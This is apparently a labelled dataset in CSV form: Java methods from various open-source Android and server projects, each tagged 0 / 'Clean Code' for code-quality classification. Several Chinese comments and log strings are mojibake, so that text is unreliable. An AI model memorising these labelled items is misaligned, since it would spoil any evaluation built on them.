text,label,text_label
"@Override public Map<String,Object> getDataMapForNewExamine(ExamineConditionDataBO examineConditionDataBO){
  Map<String,Object> dataMap=new HashMap<>(8);
  Integer id=examineConditionDataBO.getTypeId();
  Integer categoryId=examineConditionDataBO.getCategoryId();
  List<String> fieldList=examineConditionDataBO.getFieldList();
  OaExamine oaExamine=this.getById(id);
  if (oaExamine == null) {
    throw new CrmException(OaCodeEnum.EXAMINE_ALREADY_DELETE);
  }
  List<OaExamineField> examineFields=examineFieldService.queryField(categoryId);
  Map<Integer,String> fieldData=examineFieldService.queryFieldData(oaExamine.getBatchId());
  examineFields.forEach(field -> {
    if (""content"".equals(field.getFieldName())) {
      field.setValue(oaExamine.getContent());
    }
 else     if (""remark"".equals(field.getFieldName())) {
      field.setValue(oaExamine.getRemark());
    }
 else {
      field.setValue(Optional.ofNullable(fieldData.get(field.getFieldId())).orElse(""""));
    }
  }
);
  examineFieldService.transferFieldList(examineFields,2);
  for (  String field : fieldList) {
    for (    OaExamineField examineField : examineFields) {
      if (field.equals(examineField.getFieldName())) {
        dataMap.put(field,examineField.getValue());
        break;
      }
    }
  }
  dataMap.put(""createUserId"",oaExamine.getCreateUserId());
  return dataMap;
}",0,Clean Code
"@Override public boolean isValid(WorkflowTask workflowTask,ConstraintValidatorContext context){
  context.disableDefaultConstraintViolation();
  boolean valid=true;
switch (workflowTask.getType()) {
case TaskType.TASK_TYPE_EVENT:
    valid=isEventTaskValid(workflowTask,context);
  break;
case TaskType.TASK_TYPE_DECISION:
valid=isDecisionTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_SWITCH:
valid=isSwitchTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_DYNAMIC:
valid=isDynamicTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_FORK_JOIN_DYNAMIC:
valid=isDynamicForkJoinValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_HTTP:
valid=isHttpTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_FORK_JOIN:
valid=isForkJoinTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_TERMINATE:
valid=isTerminateTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_KAFKA_PUBLISH:
valid=isKafkaPublishTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_DO_WHILE:
valid=isDoWhileTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_SUB_WORKFLOW:
valid=isSubWorkflowTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_JSON_JQ_TRANSFORM:
valid=isJSONJQTransformTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_WAIT:
valid=isWaitTaskValid(workflowTask,context);
break;
}
return valid;
}
",0,Clean Code
"public void setTransaction(Transaction transaction){
  try {
    ByteArrayOutputStream baos=new ByteArrayOutputStream();
    transaction.bitcoinSerializeToStream(baos);
    fullHex=Utils.bytesToHex(baos.toByteArray());
    String hex=fullHex;
    if (hex.length() > TRUNCATE_AT) {
      hex=hex.substring(0,TRUNCATE_AT);
      hex+=""[truncated]"";
    }
    clear();
    appendText(hex);
    previousSegmentList=new ArrayList<>();
    setContextMenu(new TransactionHexContextMenu(fullHex));
  }
 catch (  IOException e) {
    throw new IllegalStateException(""Can't happen"");
  }
}",0,Clean Code
"public static void start(String[] args){
  if (!ConfigFileManager.tryLock())   System.exit(0);
  int systemServerMaxRetry=1;
  for (  String arg : args) {
    if (arg.equals(""--from-service"")) {
      Log.w(TAG,""LSPosed daemon is not started properly. Try for a late start..."");
    }
 else     if (arg.startsWith(""--system-server-max-retry="")) {
      try {
        systemServerMaxRetry=Integer.parseInt(arg.substring(arg.lastIndexOf('=') + 1));
      }
 catch (      Throwable ignored) {
      }
    }
  }
  Log.i(TAG,""starting server..."");
  Log.i(TAG,String.format(""version %s (%d)"",BuildConfig.VERSION_NAME,BuildConfig.VERSION_CODE));
  Thread.setDefaultUncaughtExceptionHandler((t,e) -> {
    Log.e(TAG,""Uncaught exception"",e);
    System.exit(1);
  }
);
  logcatService=new LogcatService();
  logcatService.start();
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)   permissionManagerWorkaround();
  Process.setThreadPriority(Process.THREAD_PRIORITY_FOREGROUND);
  Looper.prepareMainLooper();
  mainService=new LSPosedService();
  applicationService=new LSPApplicationService();
  managerService=new LSPManagerService();
  systemServerService=new LSPSystemServerService(systemServerMaxRetry);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
    dex2OatService=new Dex2OatService();
    dex2OatService.start();
  }
  systemServerService.putBinderForSystemServer();
  var configManager=ConfigManager.getInstance();
  ActivityThread.systemMain();
  DdmHandleAppName.setAppName(""org.lsposed.daemon"",0);
  waitSystemService(""package"");
  waitSystemService(""activity"");
  waitSystemService(Context.USER_SERVICE);
  waitSystemService(Context.APP_OPS_SERVICE);
  ConfigFileManager.reloadConfiguration();
  BridgeService.send(mainService,new BridgeService.Listener(){
    @Override public void onSystemServerRestarted(){
      Log.w(TAG,""system restarted..."");
    }
    @Override public void onResponseFromBridgeService(    boolean response){
      if (response) {
        Log.i(TAG,""sent service to bridge"");
      }
 else {
        Log.w(TAG,""no response from bridge"");
      }
      systemServerService.maybeRetryInject();
    }
    @Override public void onSystemServerDied(){
      Log.w(TAG,""system server died"");
      systemServerService.putBinderForSystemServer();
      managerService.onSystemServerDied();
    }
  }
);
  if (!configManager.verboseLog()) {
    logcatService.stopVerbose();
  }
  Looper.loop();
  throw new RuntimeException(""Main thread loop unexpectedly exited"");
}",0,Clean Code
"private void onTgVoipStop(Instance.FinalState finalState){
  if (user == null) {
    return;
  }
  if (TextUtils.isEmpty(finalState.debugLog)) {
    try {
      finalState.debugLog=getStringFromFile(VoIPHelper.getLogFilePath(privateCall.id,true));
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
  }
  if (needRateCall || forceRating || finalState.isRatingSuggested) {
    startRatingActivity();
    needRateCall=false;
  }
  if (needSendDebugLog && finalState.debugLog != null) {
    TLRPC.TL_phone_saveCallDebug req=new TLRPC.TL_phone_saveCallDebug();
    req.debug=new TLRPC.TL_dataJSON();
    req.debug.data=finalState.debugLog;
    req.peer=new TLRPC.TL_inputPhoneCall();
    req.peer.access_hash=privateCall.access_hash;
    req.peer.id=privateCall.id;
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
      if (BuildVars.LOGS_ENABLED) {
        FileLog.d(""Sent debug logs, response = "" + response);
      }
    }
);
    needSendDebugLog=false;
  }
}
",0,Clean Code
"@Test public void testAllActivatedTrackSelectionAreReleasedWhenTrackSelectionsAreRemade() throws Exception {
  Timeline timeline=new FakeTimeline(1);
  MediaSource mediaSource=new FakeMediaSource(timeline,null,Builder.VIDEO_FORMAT,Builder.AUDIO_FORMAT);
  FakeRenderer videoRenderer=new FakeRenderer(Builder.VIDEO_FORMAT);
  FakeRenderer audioRenderer=new FakeRenderer(Builder.AUDIO_FORMAT);
  final FakeTrackSelector trackSelector=new FakeTrackSelector();
  ActionSchedule disableTrackAction=new ActionSchedule.Builder(""testChangeTrackSelection"").pause().waitForPlaybackState(Player.STATE_READY).disableRenderer(0).play().build();
  new Builder().setMediaSource(mediaSource).setRenderers(videoRenderer,audioRenderer).setTrackSelector(trackSelector).setActionSchedule(disableTrackAction).build(context).start().blockUntilEnded(TIMEOUT_MS);
  List<FakeTrackSelection> createdTrackSelections=trackSelector.getAllTrackSelections();
  int numSelectionsEnabled=0;
  for (  FakeTrackSelection trackSelection : createdTrackSelections) {
    assertThat(trackSelection.isEnabled).isFalse();
    numSelectionsEnabled+=trackSelection.enableCount;
  }
  assertThat(createdTrackSelections).hasSize(3);
  assertThat(numSelectionsEnabled).isEqualTo(3);
}",0,Clean Code
"public void updatePrefs(String... Key){
  if (Xprefs == null)   return;
  leftEnabled=Xprefs.getBoolean(""BackFromLeft"",true);
  rightEnabled=Xprefs.getBoolean(""BackFromRight"",true);
  backGestureHeightFractionLeft=Xprefs.getSliderInt(""BackLeftHeight"",100) / 100f;
  backGestureHeightFractionRight=Xprefs.getSliderInt(""BackRightHeight"",100) / 100f;
  widthFactor=Xprefs.getSliderInt(""GesPillWidthModPos"",50) * .02f;
  GesPillHeightFactor=Xprefs.getSliderInt(""GesPillHeightFactor"",100);
  int taskbarMode=TaskbarActivator.TASKBAR_DEFAULT;
  String taskbarModeStr=Xprefs.getString(""taskBarMode"",""0"");
  try {
    taskbarMode=Integer.parseInt(taskbarModeStr);
  }
 catch (  Exception ignored) {
  }
  if (taskbarMode == TaskbarActivator.TASKBAR_ON || Xprefs.getBoolean(""HideNavbar"",false)) {
    widthFactor=0f;
  }
  if (Key.length > 0) {
    refreshNavbar();
  }
  navPillColorAccent=Xprefs.getBoolean(""navPillColorAccent"",false);
}",0,Clean Code
"private void onFile(Map<String,String> params){
  String path=params.get(""path"");
  if (TextUtils.isEmpty(path))   return;
  if (path.endsWith("".xml""))   RefreshEvent.danmaku(path);
 else   if (path.endsWith("".apk""))   FileUtil.openFile(Path.local(path));
 else   if (path.endsWith("".srt"") || path.endsWith("".ssa"") || path.endsWith("".ass""))   RefreshEvent.subtitle(path);
 else   ServerEvent.setting(path);
}
",0,Clean Code
"/** 
 * 鑾峰彇浠ｇ悊瀵硅薄鐨勫師濮嬪璞�
 * @author fengshuonan
 * @date 2020/10/19 16:21
 */
public static Object getTarget(Object proxy){
  if (!AopUtils.isAopProxy(proxy)) {
    return proxy;
  }
  try {
    if (AopUtils.isJdkDynamicProxy(proxy)) {
      return getJdkDynamicProxyTargetObject(proxy);
    }
 else {
      return getCglibProxyTargetObject(proxy);
    }
  }
 catch (  Exception e) {
    log.error(""鑾峰彇浠ｇ悊瀵硅薄寮傚父"",e);
    return null;
  }
}",0,Clean Code
"public CipherResult encrypt(String data,String aad) throws Exception {
  CipherResult encryptResult=new CipherResult();
  KeyGenerator keyGenerator=KeyGenerator.getInstance(""AES"");
  keyGenerator.init(AES_KEY_SIZE);
  SecretKey key=keyGenerator.generateKey();
  byte[] iv=new byte[GCM_IV_LENGTH];
  SecureRandom random=new SecureRandom();
  random.nextBytes(iv);
  byte[] aaddata=null;
  if (!StringUtils.isEmpty(aad))   aaddata=aad.getBytes();
  encryptResult.setCipherText(Base64.getEncoder().encodeToString(doEncrypt(data.getBytes(),key,iv,aaddata)));
  CipherData cipherData=new CipherData();
  cipherData.setIv(Base64.getEncoder().encodeToString(iv));
  cipherData.setSecureKey(Base64.getEncoder().encodeToString(key.getEncoded()));
  cipherRepository.save(cipherData);
  encryptResult.setId(cipherData.getId());
  return encryptResult;
}",0,Clean Code
"@Override protected void beforeHookedMethod(MethodHookParam param1) throws Throwable {
  if (HidePrivacyChip) {
    try {
      ((List<?>)getObjectField(param.thisObject,""privacyList"")).clear();
    }
 catch (    Throwable ignored) {
    }
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  setObjectField(param.thisObject,""mIsStaticLayout"",false);
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  NotificationIconContainerOverride.calculateIconXTranslations(param);
  param.setResult(null);
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (param.args[0] != mClockView)   return;
  for (  ClockVisibilityCallback c : clockVisibilityCallbacks) {
    try {
      c.OnVisibilityChanged(true);
    }
 catch (    Exception ignored) {
    }
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  setObjectField(param.thisObject,""mAmPmStyle"",AM_PM_STYLE_GONE);
  setObjectField(param.thisObject,""mShowSeconds"",mShowSeconds);
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (HideRoamingState)   param.setResult(false);
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (HideRoamingState)   param.setResult(false);
}",0,Clean Code
"@Test public void testUpdateNotifyMessageRead(){
  NotifyMessageDO dbNotifyMessage=randomPojo(NotifyMessageDO.class,o -> {
    o.setUserId(1L);
    o.setUserType(UserTypeEnum.ADMIN.getValue());
    o.setReadStatus(false);
    o.setReadTime(null);
    o.setTemplateParams(randomTemplateParams());
  }
);
  notifyMessageMapper.insert(dbNotifyMessage);
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setUserId(2L)));
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setUserType(UserTypeEnum.MEMBER.getValue())));
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setReadStatus(true)));
  Collection<Long> ids=Arrays.asList(dbNotifyMessage.getId(),dbNotifyMessage.getId() + 1,dbNotifyMessage.getId() + 2,dbNotifyMessage.getId() + 3);
  Long userId=1L;
  Integer userType=UserTypeEnum.ADMIN.getValue();
  int updateCount=notifyMessageService.updateNotifyMessageRead(ids,userId,userType);
  assertEquals(1,updateCount);
  NotifyMessageDO notifyMessage=notifyMessageMapper.selectById(dbNotifyMessage.getId());
  assertTrue(notifyMessage.getReadStatus());
  assertNotNull(notifyMessage.getReadTime());
}",0,Clean Code
"/** 
 * See  {@link MediaSessionCompat.Callback#onSetRating(RatingCompat)}. 
 */
void onSetRating(Player player,RatingCompat rating);
/** 
 * See  {@link MediaSessionCompat.Callback#onSetRating(RatingCompat,Bundle)}. 
 */
void onSetRating(Player player,RatingCompat rating,Bundle extras);
@Override public void onSetRating(RatingCompat rating){
  if (canDispatchSetRating()) {
    ratingCallback.onSetRating(player,rating);
  }
}
@Override public void onSetRating(RatingCompat rating,Bundle extras){
  if (canDispatchSetRating()) {
    ratingCallback.onSetRating(player,rating,extras);
  }
}
",0,Clean Code
"@Around(""@annotation(xyz.playedu.common.annotation.Lock)"") public Object around(ProceedingJoinPoint joinPoint) throws Throwable {
  MethodSignature signature=(MethodSignature)joinPoint.getSignature();
  Method method=signature.getMethod();
  Lock distributedLock=method.getAnnotation(Lock.class);
  String key=distributedLock.key();
  long expire=distributedLock.expire();
  TimeUnit timeUnit=distributedLock.timeUnit();
  boolean success=redisDistributedLock.tryLock(key,expire,timeUnit);
  if (!success) {
    throw new LimitException(""璇风◢鍚庡啀璇�"");
  }
  try {
    return joinPoint.proceed();
  }
  finally {
    redisDistributedLock.releaseLock(key);
  }
}
",0,Clean Code
"@Override @SneakyThrows public Integer createWithChainList(List<String> ou){
  if (ou == null || ou.isEmpty()) {
    return 0;
  }
  Department department=null;
  for (int i=0; i < ou.size(); i++) {
    String name=ou.get(i);
    Integer parentId=department == null ? 0 : department.getId();
    department=getOne(query().getWrapper().eq(""name"",name).eq(""parent_id"",parentId));
    if (department == null) {
      Integer depId=create(name,parentId,i);
      department=new Department();
      department.setId(depId);
    }
  }
  return department.getId();
}",0,Clean Code
"private Label createInformation(GridPane grid){
  var information=new Label();
  information.setGraphicTextGap(7);
  information.getStyleClass().add(""information"");
  AppFont.header(information);
  var state=wrapper.getEntry().getProvider() != null ? wrapper.getEntry().getProvider().stateDisplay(wrapper) : Comp.empty();
  information.setGraphic(state.createRegion());
  var info=wrapper.getEntry().getProvider().informationString(wrapper);
  var summary=wrapper.getSummary();
  if (wrapper.getEntry().getProvider() != null) {
    information.textProperty().bind(PlatformThread.sync(Bindings.createStringBinding(() -> {
      var val=summary.getValue();
      if (val != null && grid.isHover() && wrapper.getEntry().getProvider().alwaysShowSummary()) {
        return val;
      }
 else {
        return info.getValue();
      }
    }
,grid.hoverProperty(),info,summary)));
  }
  return information;
}",0,Clean Code
"private int sendRequest(int count,Supplier<CloseableHttpClient> client) throws InterruptedException {
  AtomicInteger atomicInteger=new AtomicInteger();
  ExecutorService threadPool=Executors.newCachedThreadPool();
  long begin=System.currentTimeMillis();
  IntStream.rangeClosed(1,count).forEach(i -> {
    threadPool.execute(() -> {
      try (CloseableHttpResponse response=client.get().execute(new HttpGet(""http://127.0.0.1:45678/routelimit/server""))){
        atomicInteger.addAndGet(Integer.parseInt(EntityUtils.toString(response.getEntity())));
      }
 catch (      Exception ex) {
        ex.printStackTrace();
      }
    }
);
  }
);
  threadPool.shutdown();
  threadPool.awaitTermination(1,TimeUnit.HOURS);
  log.info(""鍙戦 {} 娆¤姹傦紝鑰楁椂 {} ms"",atomicInteger.get(),System.currentTimeMillis() - begin);
  return atomicInteger.get();
}",0,Clean Code
